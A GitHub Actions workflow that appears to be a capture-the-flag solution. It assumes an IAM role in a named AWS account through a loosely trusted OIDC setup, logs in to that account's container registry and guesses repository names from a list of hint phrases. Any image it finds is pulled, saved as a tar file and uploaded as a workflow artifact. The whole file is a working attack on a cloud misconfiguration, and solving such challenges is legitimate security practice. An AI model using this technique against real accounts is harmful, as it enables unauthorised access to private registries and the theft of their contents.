name: Explore AWS ECR & Save Images

on:
  workflow_dispatch:

jobs:
  assume-and-explore:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read

    steps:
      - name: Checkout repo
        uses: actions/checkout@v4

      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::396961015104:role/imaginary-challenge
          aws-region: us-east-1

      - name: Check identity
        run: aws sts get-caller-identity

      - name: Login to ECR
        run: |
          aws ecr get-login-password --region us-east-1 | docker login --username AWS --password-stdin 396961015104.dkr.ecr.us-east-1.amazonaws.com

      - name: Try Phrase-Based Docker Images
        run: |
          PHRASES=(
            "never-imagined" "never_imagined" "i-never-imagined"
            "misconfigure-cloud" "misconfigured-cloud" "cloud-misconfiguration"
            "github-actions-insecure" "actions-insecure" "insecure-actions"
            "fiddling-workflow" "fiddle-workflow" "workflow-fiddling"
            "download-docker-image" "docker-download" "image-download"
            "where-docker" "from-where" "where-from"
            "oidc-cool" "cool-oidc" "oidc-misconfigured"
            "be-careful" "careful-oidc" "oidc-careful"
          )

          mkdir -p pulled_images
          for phrase in "${PHRASES[@]}"; do
            echo "Trying: $phrase"
            if docker pull 396961015104.dkr.ecr.us-east-1.amazonaws.com/$phrase:latest 2>/dev/null; then
              echo "ðŸŽ‰ FOUND: $phrase"
              docker images | grep $phrase
              docker save -o pulled_images/$phrase.tar 396961015104.dkr.ecr.us-east-1.amazonaws.com/$phrase:latest
              break
            fi
          done

      - name: Upload Pulled Images as Artifact
        uses: actions/upload-artifact@v3
        with:
          name: pulled-docker-images
          path: pulled_images/
